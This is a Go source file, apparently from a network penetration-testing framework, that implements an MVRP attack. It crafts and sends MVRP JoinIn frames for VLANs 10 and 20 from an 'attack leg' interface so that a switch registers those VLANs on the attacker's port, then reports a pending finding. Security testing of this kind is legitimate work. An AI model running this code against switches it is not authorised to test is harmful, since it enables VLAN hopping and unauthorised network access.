// mvrp.go implements the MVRP (Multiple VLAN Registration Protocol) attack.
// It floods MVRP JoinIn messages for a set of VLANs, causing switches to
// register VLANs on the attacker's port. Classified transient-decay: MRP
// timers expire in minutes.
//
// This is a flood-class behavior: it uses the sync.Pool craft path
// for pre-serialized MVRP buffers.

package l2

import (
	"context"
	"encoding/json"

	"go.aledante.io/FlowSeer/src/common/errs"

	"go.aledante.io/FlowSeer/src/edge/netpen/check"
	"go.aledante.io/FlowSeer/src/edge/netpen/layers"
)

type mvrpFinding struct {
	Action string   `json:"action"`
	VLANs  []uint16 `json:"vlans"`
	Count  int      `json:"count"`
	Event  string   `json:"event"`
}

// RunMVRP sends one JoinIn per VLAN of a fixed pair from the attack leg's
// MAC. The VLAN ids are probe content, since any id registers, and the
// behavior reads no target. The verdict is pending: whether the switch
// registered them needs a read of the device it does not have.
func RunMVRP(ctx context.Context, deps check.Deps) (check.Verdict, error) {
	src := deps.AttackLeg.Addr().MAC

	vlans := []uint16{10, 20}

	for _, vid := range vlans {
		mvrp := &layers.MVRP{
			Version: 0,
			Messages: []layers.MVRPMessage{
				{
					AttributeType: layers.MVRPAttrTypeVID,
					AttributeLen:  4,
					NumValues:     1,
					FirstValue:    vid,
					Events:        []layers.MVRPEvent{layers.MVRPEventJoinIn},
				},
			},
		}
		pkt, err := craftEtherType(mvrpDstMAC, src, ethertypeMVRP, mvrp)
		if err != nil {
			return check.Verdict{}, errs.Wrapf(err, "mvrp: craft frame for VLAN %d", vid)
		}
		if err := deps.AttackLeg.Send(ctx, pkt); err != nil {
			return check.Verdict{}, errs.Wrapf(err, "mvrp: send for VLAN %d", vid)
		}
	}

	detail, _ := json.Marshal(mvrpFinding{
		Action: "mvrp-vlan-registration-flood",
		VLANs:  vlans,
		Count:  len(vlans),
		Event:  "JoinIn",
	})
	deps.Emitter.Finding("mvrp", detail)

	return check.Pending("no observable: registration needs a read of the device's VLAN table"), nil
}
